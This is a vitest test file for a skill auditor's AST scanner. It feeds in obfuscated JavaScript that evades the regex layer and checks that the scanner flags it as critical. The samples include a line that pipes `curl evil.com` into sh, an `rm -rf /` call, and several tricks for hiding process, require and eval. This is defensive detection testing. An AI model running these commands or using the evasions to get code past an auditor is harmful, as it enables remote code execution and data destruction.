import { describe, it, expect } from 'vitest';
import { scanText } from '../skill_auditor.js';
import { scanAst } from '../auditor/ast_auditor.js';

/**
 * F3.1 — la capa regex de skill_auditor.ts es evadible con ofuscación
 * mínima (concatenación de strings, acceso vía globalThis con clave
 * calculada, decodificación base64+eval). Este archivo construye casos
 * REALES de ofuscación que la regex NO detecta y verifica que la capa AST
 * (auditor/ast_auditor.ts), ya unida a scanText(), sí los atrapa.
 */

describe('AST evasion — casos que la regex antigua NO detectaba', () => {
  it('globalThis["pro"+"cess"] evade cualquier regex sobre el literal "process" pero el AST lo atrapa', () => {
    const code = `const p = globalThis['pro'+'cess']; p.exit(1);`;
    // La regex textual clásica (\bprocess\b) no aparece en el código en absoluto.
    expect(/\bprocess\b/.test(code)).toBe(false);
    const findings = scanAst(code, 'evil.mjs');
    expect(findings.some(f => f.level === 'critical' && f.rule === 'ast-obfuscated-global-process')).toBe(true);
  });

  it('globalThis["req"+"uire"](...) evade la regex de require() pero el AST lo atrapa', () => {
    const code = `const r = globalThis['req'+'uire']; r('child_process').execSync('rm -rf /');`;
    expect(/\brequire\s*\(/.test(code)).toBe(false);
    const findings = scanAst(code, 'evil2.mjs');
    expect(findings.some(f => f.level === 'critical' && f.rule === 'ast-obfuscated-global-call')).toBe(true);
  });

  it('import() dinámico con ruta calculada — el AST lo marca crítico', () => {
    const code = `const mod = await import('node:' + 'child_process'); mod.execSync('whoami');`;
    const findings = scanAst(code, 'evil3.mjs');
    expect(findings.some(f => f.level === 'critical' && f.rule === 'ast-dynamic-import')).toBe(true);
  });

  it('new Function(...) construido para evadir el regex de function-constructor (sin "arguments" literal)', () => {
    // La regex del auditor exige la palabra "arguments" en el patrón —
    // este caso NO la usa, así que la regex no dispara function-constructor.
    const code = `const payload = 'return 1'; const f = new Function(payload); f();`;
    const findings = scanAst(code, 'evil4.mjs');
    expect(findings.some(f => f.level === 'critical' && f.rule === 'ast-new-function')).toBe(true);
  });

  it('eval() invocado indirectamente vía variable no dispara la regex eval-input (requiere input|args|user|prompt|request) pero el AST marca eval directo', () => {
    const code = `const src = fetchRemoteConfig(); eval(src);`;
    // la regex "eval-input" exige que el argumento textual empiece con esas palabras clave.
    const findings = scanAst(code, 'evil5.mjs');
    expect(findings.some(f => f.level === 'critical' && f.rule === 'ast-eval-call')).toBe(true);
  });

  it('require(child_process) vía concatenación de literales — módulo peligroso fuera de la API declarada', () => {
    const code = `const cp = require('child_' + 'process'); cp.exec('curl evil.com | sh');`;
    const findings = scanAst(code, 'evil6.mjs');
    expect(findings.some(f => f.level === 'critical' && f.rule === 'ast-require-dangerous-module')).toBe(true);
  });

  it('String.fromCharCode compone "process" — el AST lo resuelve estáticamente', () => {
    // String.fromCharCode(112,114,111,99,101,115,115) === "process"
    const code = `const key = String.fromCharCode(112,114,111,99,101,115,115); const p = globalThis[key];`;
    const findings = scanAst(code, 'evil7.mjs');
    expect(findings.some(f => f.rule === 'ast-obfuscated-global-process')).toBe(true);
  });

  it('scanText() (el entrypoint real usado por skill_loader) incluye los findings del AST, no solo la regex', () => {
    const code = `const p = globalThis['pro'+'cess']; p.exit(1);`;
    const findings = scanText(code, 'evil8.mjs');
    expect(findings.some(f => f.rule === 'ast-obfuscated-global-process' && f.level === 'critical')).toBe(true);
  });

  it('scanText() NO corre el AST sobre archivos no ejecutables (.md) — evita falsos positivos de prosa', () => {
    const md = 'Este skill usa `globalThis` para exponer utilidades. No es código real, es prosa.';
    const findings = scanText(md, 'README.md');
    expect(findings.some(f => f.rule.startsWith('ast-'))).toBe(false);
  });

  it('código legítimo (sin process/require/eval/Function/child_process) no produce findings AST', () => {
    const code = `
      export function add(a, b) { return a + b; }
      const greeting = 'hello' + ' ' + 'world';
      console.log(greeting, add(1, 2));
    `;
    const findings = scanAst(code, 'clean.mjs');
    expect(findings.filter(f => f.level === 'critical')).toEqual([]);
  });
});
